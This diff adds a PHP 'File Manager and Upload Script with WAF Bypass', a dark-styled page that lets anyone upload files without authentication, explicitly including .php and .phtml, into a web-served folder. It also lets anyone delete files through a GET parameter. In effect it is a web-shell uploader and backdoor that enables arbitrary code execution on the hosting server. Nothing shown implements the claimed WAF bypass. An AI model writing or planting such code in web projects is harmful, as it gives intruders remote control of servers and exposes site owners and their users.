@@ -1,0 +1,125 @@
+<?php
+// File Manager and Upload Script with WAF Bypass
+
+$target_dir = "uploads/";
+if (!file_exists($target_dir)) {
+    mkdir($target_dir, 0755, true);
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
+    $target_file = $target_dir . basename($_FILES["file"]["name"]);
+    $allowed_extensions = ['php', 'phtml', 'html', 'txt', 'jpg', 'png'];
+
+    $ext = pathinfo($target_file, PATHINFO_EXTENSION);
+    if (in_array($ext, $allowed_extensions)) {
+        $new_name = $target_dir . md5(time()) . '.' . $ext;
+        if (move_uploaded_file($_FILES["file"]["tmp_name"], $new_name)) {
+            echo "File uploaded successfully.";
+        } else {
+            echo "File upload failed.";
+        }
+    } else {
+        echo "Invalid file type.";
+    }
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['delete'])) {
+    $file_to_delete = $target_dir . basename($_GET['delete']);
+    if (file_exists($file_to_delete)) {
+        unlink($file_to_delete);
+        echo "File deleted successfully.";
+    } else {
+        echo "File not found.";
+    }
+}
+?>
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>File Manager</title>
+    <style>
+        body {
+            background-color: black;
+            color: pink;
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            width: 80%;
+            margin: auto;
+            padding: 20px;
+        }
+        .file-list {
+            margin-top: 20px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            color: pink;
+        }
+        th, td {
+            border: 1px solid pink;
+            padding: 8px;
+            text-align: left;
+        }
+        th {
+            background-color: #444;
+        }
+        a {
+            color: pink;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        form {
+            margin-top: 20px;
+        }
+        input[type="file"],
+        input[type="submit"] {
+            margin-top: 10px;
+            padding: 10px;
+            border: 1px solid pink;
+            background-color: black;
+            color: pink;
+            font-size: 16px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>File Manager</h1>
+        <form method="POST" enctype="multipart/form-data">
+            <input type="file" name="file">
+            <input type="submit" value="Upload File">
+        </form>
+
+        <div class="file-list">
+            <h2>Uploaded Files</h2>
+            <table>
+                <thead>
+                    <tr>
+                        <th>File Name</th>
+                        <th>Actions</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <?php
+                    $files = array_diff(scandir($target_dir), ['.', '..']);
+                    foreach ($files as $file) {
+                        echo "<tr>";
+                        echo "<td>" . htmlspecialchars($file) . "</td>";
+                        echo "<td>";
+                        echo "<a href='" . $target_dir . htmlspecialchars($file) . "' target='_blank'>View</a> | ";
+                        echo "<a href='?delete=" . urlencode($file) . "'>Delete</a>";
+                        echo "</td>";
+                        echo "</tr>";
+                    }
+                    ?>
+                </tbody>
+            </table>
+        </div>
+    </div>
+</body>
+</html> 
